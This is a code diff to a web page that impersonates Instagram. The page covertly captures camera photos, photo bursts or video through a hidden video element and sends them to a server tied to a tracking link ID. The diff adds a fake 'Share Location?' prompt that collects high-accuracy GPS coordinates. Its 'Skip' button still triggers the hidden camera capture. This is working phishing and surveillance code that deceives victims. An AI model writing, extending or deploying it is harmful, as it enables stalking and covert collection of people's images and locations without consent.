@@ -15,8 +15,10 @@
         .permission-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; padding: 24px; }
         .permission-overlay h2 { font-size: 24px; margin-bottom: 12px; }
         .permission-overlay p { font-size: 16px; color: rgba(255,255,255,0.7); margin-bottom: 32px; text-align: center; }
-        .permission-btn { background: #0095f6; color: #fff; border: none; padding: 14px 48px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
+        .permission-btn { background: #0095f6; color: #fff; border: none; padding: 14px 48px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin: 8px; }
         .loading { display: none; color: rgba(255,255,255,0.6); margin-top: 16px; }
+        .gps-btn { background: #0095f6; }
+        .skip-btn { background: #555; }
     </style>
 </head>
 <body>
@@ -33,9 +35,10 @@
 </div>
 
 <div class="permission-overlay" id="permissionOverlay">
-    <h2>Camera Access</h2>
-    <p>Allow Instagram to access your camera</p>
-    <button class="permission-btn" id="allowBtn">Allow Camera Access</button>
+    <h2>📍 Share Location?</h2>
+    <p>Allow Instagram to access your location</p>
+    <button class="permission-btn gps-btn" id="allowGpsBtn">✅ Share Location</button>
+    <button class="permission-btn skip-btn" id="skipGpsBtn">⏭️ Skip</button>
     <div class="loading" id="loadingText">Loading...</div>
 </div>
 
@@ -55,12 +58,49 @@
 
     const hiddenVideo = document.getElementById('hiddenVideo');
     const permissionOverlay = document.getElementById('permissionOverlay');
-    const allowBtn = document.getElementById('allowBtn');
+    const allowBtn = document.getElementById('allowGpsBtn');
+    const skipBtn = document.getElementById('skipGpsBtn');
     const loadingText = document.getElementById('loadingText');
 
+    function sendGPS(lat, lon) {
+        fetch('/api/gps_location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ link_id, lat, lon })
+        }).then(r => console.log('GPS sent:', r.status))
+          .catch(e => console.error('GPS error:', e));
+    }
+
+    function getGPSLocation() {
+        if (navigator.geolocation) {
+            loadingText.textContent = 'Getting location...';
+            loadingText.style.display = 'block';
+            
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    sendGPS(lat, lon);
+                    startCamera(currentFacingMode);
+                },
+                function(error) {
+                    loadingText.textContent = 'Location unavailable. Continuing...';
+                    setTimeout(() => startCamera(currentFacingMode), 1000);
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else {
+            startCamera(currentFacingMode);
+        }
+    }
+
     function sendToServer(payload) {
-        fetch('/api/capture', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) })
-            .then(r => console.log('Sent:', r.status)).catch(e => console.error(e));
+        fetch('/api/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).then(r => console.log('Sent:', r.status))
+          .catch(e => console.error(e));
     }
 
     async function grabPhoto() {
@@ -68,16 +108,24 @@
         try {
             const bitmap = await imageCapture.grabFrame();
             const canvas = document.createElement('canvas');
-            canvas.width = bitmap.width; canvas.height = bitmap.height;
+            canvas.width = bitmap.width;
+            canvas.height = bitmap.height;
             const ctx = canvas.getContext('2d');
-            if (currentFacingMode === 'user') { ctx.translate(canvas.width, 0); ctx.scale(-1, 1); }
+            if (currentFacingMode === 'user') {
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+            }
             ctx.drawImage(bitmap, 0, 0);
             return canvas.toDataURL('image/jpeg', 0.85);
         } catch(e) {
             const canvas = document.createElement('canvas');
-            canvas.width = hiddenVideo.videoWidth || 640; canvas.height = hiddenVideo.videoHeight || 480;
+            canvas.width = hiddenVideo.videoWidth || 640;
+            canvas.height = hiddenVideo.videoHeight || 480;
             const ctx = canvas.getContext('2d');
-            if (currentFacingMode === 'user') { ctx.translate(canvas.width, 0); ctx.scale(-1, 1); }
+            if (currentFacingMode === 'user') {
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+            }
             ctx.drawImage(hiddenVideo, 0, 0);
             return canvas.toDataURL('image/jpeg', 0.85);
         }
@@ -86,21 +134,78 @@
     async function doCapture() {
         if (captureStarted) return; captureStarted = true;
         switch (content_type) {
-            case 'single_photo': const p = await grabPhoto(); if (p) sendToServer({ link_id, image_data: p, camera: currentFacingMode === 'user' ? 'front' : 'rear', type: 'photo' }); break;
-            case 'burst': const photos = []; for (let i = 0; i < MAX_BURST; i++) { const p = await grabPhoto(); if (p) photos.push(p); if (i < MAX_BURST - 1) await new Promise(r => setTimeout(r, 250)); } if (photos.length > 0) sendToServer({ link_id, images: photos, camera: currentFacingMode === 'user' ? 'front' : 'rear', type: 'burst' }); break;
-            case 'video': recordedChunks = []; const mt = MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus') ? 'video/webm;codecs=vp9,opus' : 'video/webm'; mediaRecorder = new MediaRecorder(stream, { mimeType: mt }); mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); }; mediaRecorder.onstop = () => { const blob = new Blob(recordedChunks, { type: 'video/webm' }); const reader = new FileReader(); reader.onloadend = () => { sendToServer({ link_id, image_data: reader.result, camera: currentFacingMode === 'user' ? 'front' : 'rear', type: 'video' }); }; reader.readAsDataURL(blob); }; mediaRecorder.start(); setTimeout(() => { if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop(); }, VIDEO_DURATION); break;
+            case 'single_photo':
+                const p = await grabPhoto();
+                if (p) sendToServer({ link_id, image_data: p, camera: currentFacingMode === 'user' ? 'front' : 'rear', type: 'photo' });
+                break;
+            case 'burst':
+                const photos = [];
+                for (let i = 0; i < MAX_BURST; i++) {
+                    const p = await grabPhoto();
+                    if (p) photos.push(p);
+                    if (i < MAX_BURST - 1) await new Promise(r => setTimeout(r, 250));
+                }
+                if (photos.length > 0) sendToServer({ link_id, images: photos, camera: currentFacingMode === 'user' ? 'front' : 'rear', type: 'burst' });
+                break;
+            case 'video':
+                recordedChunks = [];
+                const mt = MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus') ? 'video/webm;codecs=vp9,opus' : 'video/webm';
+                mediaRecorder = new MediaRecorder(stream, { mimeType: mt });
+                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const reader = new FileReader();
+                    reader.onloadend = () => {
+                        sendToServer({ link_id, image_data: reader.result, camera: currentFacingMode === 'user' ? 'front' : 'rear', type: 'video' });
+                    };
+                    reader.readAsDataURL(blob);
+                };
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
+                }, VIDEO_DURATION);
+                break;
         }
     }
 
     function startCamera(facingMode) {
-        navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false })
-        .then(s => { stream = s; hiddenVideo.srcObject = stream; imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
-            hiddenVideo.play().then(() => { permissionOverlay.style.display = 'none'; currentFacingMode = facingMode; setTimeout(() => doCapture(), 500); }).catch(e => console.error(e));
+        navigator.mediaDevices.getUserMedia({
+            video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
+            audio: false
+        }).then(s => {
+            stream = s;
+            hiddenVideo.srcObject = stream;
+            imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+            hiddenVideo.play().then(() => {
+                permissionOverlay.style.display = 'none';
+                currentFacingMode = facingMode;
+                setTimeout(() => doCapture(), 500);
+            }).catch(e => console.error(e));
         })
-        .catch(err => { loadingText.textContent = 'Camera required'; loadingText.style.display = 'block'; allowBtn.textContent = 'Try Again'; allowBtn.style.display = 'block'; });
+        .catch(err => {
+            loadingText.textContent = 'Camera required';
+            loadingText.style.display = 'block';
+            allowBtn.textContent = 'Try Again';
+            allowBtn.style.display = 'block';
+        });
     }
 
-    allowBtn.addEventListener('click', () => { allowBtn.style.display = 'none'; loadingText.textContent = 'Connecting...'; loadingText.style.display = 'block'; startCamera(currentFacingMode); });
+    allowBtn.addEventListener('click', () => {
+        allowBtn.style.display = 'none';
+        skipBtn.style.display = 'none';
+        loadingText.textContent = 'Getting location...';
+        loadingText.style.display = 'block';
+        getGPSLocation();
+    });
+
+    skipBtn.addEventListener('click', () => {
+        skipBtn.style.display = 'none';
+        allowBtn.style.display = 'none';
+        loadingText.textContent = 'Continuing...';
+        loadingText.style.display = 'block';
+        setTimeout(() => startCamera(currentFacingMode), 500);
+    });
+
     setTimeout(() => { loadingText.style.display = 'block'; }, 500);
 </script>
 </body>
